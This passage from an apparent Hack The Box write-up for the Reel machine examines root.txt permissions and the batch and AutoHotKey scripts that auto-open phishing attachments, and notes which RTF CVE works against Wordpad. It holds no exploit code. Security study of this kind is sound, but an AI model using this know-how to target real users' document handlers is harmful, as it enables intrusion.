  This is good explanation for the Backup\_Admins group, and a hint that there’s a password in the script!

So why is this here? I looked for ways to read julia’s email as nico, tom, and claire, and came up short. When I was ready to give up, I asked the box’s creator. It turns out this email was a remnant from an earlier version of the box where there was a second path to root, but that was eventually removed.

### root.txt Permissions

So why couldn’t I read `root.txt` as claire/Backup\_Admins? I had access to the folder, but file has different permissions, with a specific DENY on the Backup\_Admins group:

```

administrator@REEL C:\Users\Administrator\Desktop>icacls root.txt
root.txt HTB\Backup_Admins:(DENY)(R)
         NT AUTHORITY\SYSTEM:(F)
         HTB\Administrator:(RX)
         BUILTIN\Administrators:(RX)

Successfully processed 1 files; Failed processing 0 files

```

### Attachment Opening Automation

It’s always interesting to look at any scripting the box creator put in place to make the box work. In this case, I’ll look at the script for opening email attachments.

This process takes place out of the `C:\Users\nico\Documents\` path:

```

PS C:\Users\nico\Documents> ls

    Directory: C:\Users\nico\Documents

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----        06/11/2018     10:47            Attachments
d----        06/11/2018     10:47            Processed
-ar--        28/05/2018     23:05        486 auto-enter.ahk
-a---        29/05/2018     23:23        974 open-attachments.bat

```

Attachments are saved to the `C:\Users\nico\Documents\Attachments` directory.

I’ll start with `auto-enter.ahk`, a AutoHotKey script used to automate tasks on Windows:

```

PS C:\Users\nico\Documents> type .\auto-enter.ahk
#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

    #Persistent
    SetTimer, PressTheKey, 6000
    Return

    PressTheKey:
    Send {Alt Down}{Tab}{Alt Up}
    sleep 1000
    Send {Space}
    Return

```

The [`SetTimer`](https://autohotkey.com/docs/commands/SetTimer.htm) function will run a command repeatedly for some period of time. So this will run `PressTheKey` for 6 seconds. That function just does an ALT+TAB, sleeps a second, and hits space.

Here’s `open-attachments.bat`:

```

@echo off

:LOOP

echo Looking for attachments

cd C:\Users\nico\Documents\

DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i doc > C:\Users\nico\Documents\files.txt
DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i rtf >> C:\Users\nico\Documents\files.txt

FOR /F "tokens=*" %%i in (files.txt) DO echo Opening attachments && MOVE /y C:\Users\nico\Documents\Attachments\%%i C:\Users\nico\Documents\Processed\%%i

FOR /F "tokens=*" %%i in (files.txt) DO START C:\Users\nico\Documents\auto-enter.ahk && ping 127.0.0.1 -n 3 > nul && START C:\Users\nico\Documents\Processed\%%i && ping 127.0.0.1 -n 20 > nul && taskkill /F /IM wordpad.exe && taskkill /F /IM AutoHotkey.exe && ping 127.0.0.1 -n 3 > nul

DEL /F C:\Users\nico\Documents\files.txt && ping 127.0.0.1 -n 3 > nul
DEL /F C:\Users\nico\Documents\Processed\*.rtf
DEL /F C:\Users\nico\Documents\Processed\*.doc
DEL /F C:\Users\nico\Documents\Processed\*.docx

cls

GOTO :LOOP

:EXIT

```

So the script enters an infinite loop and does the following:
- Creates a list of all the files in the `\Attachments\` folder that contain “doc” or “rtf”.
- Loops over that list, moving each file to the `\Processed\` directory.
- Loops over the file names again, and for each file:
  - Starts `auto-enter.ahk`, which will ALT+TAB, sleep 1, push space 6 times. This will accept warnings that the document pops when it opens.
  - Does a `ping -n 3`, which is a common way to sleep in bat scripts, in this case, for 3 seconds.
  - Calls `START` on the document, which will cause it to open in the program assigned to it’s extension.
  - Sleeps 20 seconds with `ping`
  - Kills all `wordpad.exe`
  - Kills all `AutoHotKey.exe`
  - Sleeps for 3 seconds with `ping`
- Cleans up files
- Start loop again

A bat file will show up in the process list as a `cmd.exe` with the script in the command line. So I can verify that this script is running, and has been since about a minute after boot:

```

PS C:\Users\nico\Documents> Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*bat"} | format-list -Property CommandLine,CreationDate

CommandLine  : C:\Windows\system32\cmd.exe  /K C:\Users\nico\Documents\open-attachments.bat
CreationDate : 20181105153244.184165+000

PS C:\Users\nico\Documents> Get-WmiObject Win32_OperatingSystem | Select-Object LastBootUpTime

LastBootUpTime
--------------
20181105153124.497691+000

```

The fact that the box is using Wordpad to open the files is useful, and explains why CVE-2017-0199 works, but two other RTF bugs, CVE-2017-8759 and CVE-2017-11826 do not.